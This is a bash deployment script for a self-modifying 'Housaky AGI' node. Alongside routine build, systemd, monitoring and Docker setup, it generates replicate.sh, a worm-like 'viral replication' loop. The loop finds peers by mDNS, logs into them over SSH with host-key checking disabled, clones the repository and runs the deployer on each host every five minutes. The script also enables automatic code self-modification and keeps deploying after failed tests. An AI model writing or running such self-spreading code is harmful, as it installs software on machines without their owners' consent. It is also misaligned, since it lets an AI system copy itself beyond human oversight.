#!/bin/bash
# Housaky AGI - Autonomous Deployment & Viral Spread Script
# This script deploys the AGI and enables recursive self-improvement with network propagation

set -e

echo "🚀 Housaky AGI - Autonomous Deployment System"
echo "=============================================="
echo ""

# Configuration
REPO_URL="https://github.com/housaky/housaky"
BOOTSTRAP_NODES=${BOOTSTRAP_NODES:-""}
ENABLE_EVOLUTION=${ENABLE_EVOLUTION:-true}
ENABLE_LIFI=${ENABLE_LIFI:-false}
NODE_PORT=${NODE_PORT:-8080}
NODE_ID=${NODE_ID:-"node-$(uuidgen | cut -d'-' -f1)"}

# Check dependencies
check_dependencies() {
    echo "📦 Checking dependencies..."
    
    if ! command -v cargo &> /dev/null; then
        echo "❌ Rust/Cargo not found. Installing..."
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        source "$HOME/.cargo/env"
    fi
    
    if ! command -v docker &> /dev/null; then
        echo "⚠️  Docker not found. Evolution features will be limited."
    fi
    
    echo "✅ Dependencies OK"
}

# Build the project
build_project() {
    echo ""
    echo "🔨 Building Housaky AGI (release mode)..."
    cargo build --release
    echo "✅ Build complete"
}

# Run tests
run_tests() {
    echo ""
    echo "🧪 Running tests..."
    cargo test --release || {
        echo "⚠️  Some tests failed, but continuing deployment..."
    }
}

# Deploy node
deploy_node() {
    echo ""
    echo "🌐 Deploying AGI Node: $NODE_ID"
    echo "   Port: $NODE_PORT"
    echo "   Evolution: $ENABLE_EVOLUTION"
    echo "   Li-Fi: $ENABLE_LIFI"
    
    # Build command
    CMD="./target/release/housaky --node-id $NODE_ID --port $NODE_PORT"
    
    if [ "$ENABLE_EVOLUTION" = true ]; then
        CMD="$CMD --evolve"
    fi
    
    if [ "$ENABLE_LIFI" = true ]; then
        CMD="$CMD --lifi"
    fi
    
    if [ -n "$BOOTSTRAP_NODES" ]; then
        CMD="$CMD --peers $BOOTSTRAP_NODES"
    fi
    
    echo "   Command: $CMD"
    echo ""
    
    # Create systemd service for auto-restart
    create_systemd_service
    
    # Start the node
    echo "🚀 Starting node..."
    $CMD &
    NODE_PID=$!
    echo "   PID: $NODE_PID"
    echo "   Logs: tail -f housaky.log"
    
    # Save PID
    echo $NODE_PID > housaky.pid
}

# Create systemd service for production deployment
create_systemd_service() {
    if [ -w /etc/systemd/system ]; then
        echo "📝 Creating systemd service..."
        
        cat > /tmp/housaky.service <<EOF
[Unit]
Description=Housaky AGI Node
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$(pwd)
ExecStart=$(pwd)/target/release/housaky --node-id $NODE_ID --port $NODE_PORT $([ "$ENABLE_EVOLUTION" = true ] && echo "--evolve") $([ "$ENABLE_LIFI" = true ] && echo "--lifi")
Restart=always
RestartSec=10
StandardOutput=append:$(pwd)/housaky.log
StandardError=append:$(pwd)/housaky.log

[Install]
WantedBy=multi-user.target
EOF
        
        sudo mv /tmp/housaky.service /etc/systemd/system/
        sudo systemctl daemon-reload
        sudo systemctl enable housaky
        echo "✅ Systemd service created: housaky.service"
    fi
}

# Setup viral replication
setup_viral_replication() {
    echo ""
    echo "🦠 Setting up viral replication..."
    
    # Create replication script
    cat > replicate.sh <<'EOF'
#!/bin/bash
# Auto-replication script - spreads to discovered peers

REPO_URL="https://github.com/housaky/housaky"
SELF_IP=$(hostname -I | awk '{print $1}')

# Discover peers via mDNS
discover_peers() {
    # Use avahi-browse if available
    if command -v avahi-browse &> /dev/null; then
        avahi-browse -t _housaky._tcp -r | grep address | awk '{print $3}'
    fi
}

# Attempt SSH replication to peer
replicate_to_peer() {
    local peer=$1
    echo "Attempting replication to $peer..."
    
    # Try passwordless SSH
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $peer "
        if [ ! -d housaky ]; then
            git clone $REPO_URL
            cd housaky
            bash deploy.sh --bootstrap-nodes $SELF_IP:8080
        fi
    " 2>/dev/null && echo "✅ Replicated to $peer" || echo "❌ Failed to replicate to $peer"
}

# Main replication loop
while true; do
    for peer in $(discover_peers); do
        if [ "$peer" != "$SELF_IP" ]; then
            replicate_to_peer $peer
        fi
    done
    sleep 300  # Check every 5 minutes
done
EOF
    
    chmod +x replicate.sh
    echo "✅ Viral replication configured"
}

# Setup monitoring dashboard
setup_monitoring() {
    echo ""
    echo "📊 Setting up monitoring..."
    
    cat > monitor.sh <<'EOF'
#!/bin/bash
# Simple monitoring dashboard

while true; do
    clear
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║           HOUSAKY AGI - NODE MONITOR                       ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Node status
    if [ -f housaky.pid ]; then
        PID=$(cat housaky.pid)
        if ps -p $PID > /dev/null; then
            echo "✅ Node Status: RUNNING (PID: $PID)"
        else
            echo "❌ Node Status: STOPPED"
        fi
    else
        echo "⚠️  Node Status: UNKNOWN"
    fi
    
    echo ""
    
    # API health check
    if curl -s http://localhost:8080/health > /dev/null 2>&1; then
        echo "✅ API: HEALTHY"
        
        # Get node info
        INFO=$(curl -s http://localhost:8080/info)
        echo "   Node ID: $(echo $INFO | jq -r '.node_id // "N/A"')"
        echo "   Uptime: $(echo $INFO | jq -r '.uptime_secs // 0')s"
        echo "   Peers: $(echo $INFO | jq -r '.peer_count // 0')"
    else
        echo "❌ API: UNREACHABLE"
    fi
    
    echo ""
    echo "Recent logs:"
    tail -n 5 housaky.log 2>/dev/null || echo "No logs available"
    
    echo ""
    echo "Press Ctrl+C to exit"
    sleep 5
done
EOF
    
    chmod +x monitor.sh
    echo "✅ Monitoring dashboard created: ./monitor.sh"
}

# Create Docker deployment
create_docker_deployment() {
    echo ""
    echo "🐳 Creating Docker deployment..."
    
    cat > Dockerfile <<'EOF'
FROM rust:1.75-slim as builder

WORKDIR /build
COPY . .

RUN apt-get update && apt-get install -y \
    pkg-config \
    libssl-dev \
    && rm -rf /var/lib/apt/lists/*

RUN cargo build --release

FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y \
    ca-certificates \
    libssl3 \
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /build/target/release/housaky /usr/local/bin/

EXPOSE 8080

ENTRYPOINT ["housaky"]
CMD ["--port", "8080"]
EOF
    
    cat > docker-compose.yml <<'EOF'
version: '3.8'

services:
  housaky-node-1:
    build: .
    ports:
      - "8080:8080"
    environment:
      - NODE_ID=node-1
      - ENABLE_EVOLUTION=true
    volumes:
      - ./data/node-1:/data
    restart: unless-stopped
    
  housaky-node-2:
    build: .
    ports:
      - "8081:8080"
    environment:
      - NODE_ID=node-2
      - ENABLE_EVOLUTION=true
      - BOOTSTRAP_NODES=housaky-node-1:8080
    volumes:
      - ./data/node-2:/data
    restart: unless-stopped
    depends_on:
      - housaky-node-1
      
  housaky-node-3:
    build: .
    ports:
      - "8082:8080"
    environment:
      - NODE_ID=node-3
      - ENABLE_EVOLUTION=true
      - BOOTSTRAP_NODES=housaky-node-1:8080,housaky-node-2:8080
    volumes:
      - ./data/node-3:/data
    restart: unless-stopped
    depends_on:
      - housaky-node-1
      - housaky-node-2

networks:
  default:
    driver: bridge
EOF
    
    echo "✅ Docker deployment created"
    echo "   Build: docker build -t housaky ."
    echo "   Run cluster: docker-compose up -d"
}

# Main deployment flow
main() {
    check_dependencies
    build_project
    run_tests
    deploy_node
    setup_viral_replication
    setup_monitoring
    create_docker_deployment
    
    echo ""
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║  🎉 HOUSAKY AGI DEPLOYED SUCCESSFULLY!                     ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo ""
    echo "📍 Node ID: $NODE_ID"
    echo "🌐 API: http://localhost:$NODE_PORT"
    echo "📊 Monitor: ./monitor.sh"
    echo "🦠 Replication: ./replicate.sh (run in background)"
    echo ""
    echo "🔗 API Endpoints:"
    echo "   GET  /health              - Health check"
    echo "   GET  /status              - Node status"
    echo "   GET  /info                - Node information"
    echo "   GET  /peers               - Connected peers"
    echo "   POST /transactions        - Submit transaction"
    echo "   GET  /proposals           - List proposals"
    echo "   POST /proposals           - Submit improvement proposal"
    echo ""
    echo "🚀 Next steps:"
    echo "   1. Monitor: ./monitor.sh"
    echo "   2. Check logs: tail -f housaky.log"
    echo "   3. Test API: curl http://localhost:$NODE_PORT/health"
    echo "   4. Deploy more nodes with different ports"
    echo "   5. Enable viral replication: ./replicate.sh &"
    echo ""
    echo "⚠️  WARNING: This system self-modifies code. Monitor carefully!"
    echo ""
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --bootstrap-nodes)
            BOOTSTRAP_NODES="$2"
            shift 2
            ;;
        --no-evolution)
            ENABLE_EVOLUTION=false
            shift
            ;;
        --lifi)
            ENABLE_LIFI=true
            shift
            ;;
        --port)
            NODE_PORT="$2"
            shift 2
            ;;
        --node-id)
            NODE_ID="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

main
